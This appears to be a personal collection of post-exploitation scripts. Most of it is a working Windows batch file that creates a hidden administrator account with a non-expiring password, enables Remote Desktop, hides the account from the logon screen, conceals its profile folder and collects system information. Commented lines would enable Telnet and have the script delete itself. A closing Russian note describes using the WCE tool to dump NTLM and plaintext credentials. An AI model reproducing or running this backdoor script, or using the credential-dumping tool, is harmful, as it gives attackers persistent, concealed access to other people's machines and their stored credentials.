## my post exploits script`s



### make hide RDP

```Markdown
@echo off
set user=Guron_18
set pass=MyPass

set AdmGroupSID=S-1-5-32-544
set AdmGroup=
For /F "UseBackQ Tokens=1* Delims==" %%I In (`WMIC Group Where "SID = '%AdmGroupSID%'" Get Name /Value ^| Find "="`) Do set AdmGroup=%%J
set AdmGroup=%AdmGroup:~0,-1%
net user %user% %pass% /add /active:"yes" /expires:"never" /passwordchg:"NO"
net localgroup %AdmGroup% %user% /add
set RDPGroupSID=S-1-5-32-555
set RDPGroup=
For /F "UseBackQ Tokens=1* Delims==" %%I In (`WMIC Group Where "SID = '%RDPGroupSID%'" Get Name /Value ^| Find "="`) Do set RDPGroup=%%J
set RDPGroup=%RDPGroup:~0,-1%
net localgroup "%RDPGroup%" %user% /add
net accounts /forcelogoff:no /maxpwage:unlimited
reg add "HKLM\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
reg add "HKLM\system\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
reg add "HKLM\system\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "MaxConnectionTime" /t REG_DWORD /d 0x1 /f
reg add "HKLM\system\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "MaxDisconnectionTime" /t REG_DWORD /d 0x0 /f
reg add "HKLM\system\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "MaxIdleTime" /t REG_DWORD /d 0x0 /f
reg add "HKLM\software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %user% /t REG_DWORD /d 0x0 /f

if not exist %systemdrive%\users\%user% mkdir %systemdrive%\users\%user%
attrib %systemdrive%\users\%user% +r +a +s +h

dxdiag /whql:off /t c:\systeminfo.txt
systeminfo >> c:\systeminfo.txt
ipconfig >> c:\systeminfo.txt

::netsh firewall add portopening TCP 3389 "Remote Desktop"
::sc config tlntsvr start=auto
::tlntadmn config port=2323 sec=-NTLM
::net start Telnet
::shutdown.exe -r -t 00 -f
::del %0


```
### Редактор учетных данных Windows [WCE](https://github.com/xymnal/wce)

Для этого инструмента требуются права администратора для создания и добавления / удаления / изменения учетных данных NTLM, а также для сброса паролей в виде открытого текста, хранящихся в пакете безопасности Windows Digest Authentication.

Билеты Kerberos могут быть получены как обычный пользователь, хотя для получения ключей сеанса в зависимости от конфигурации системы могут потребоваться права администратора.


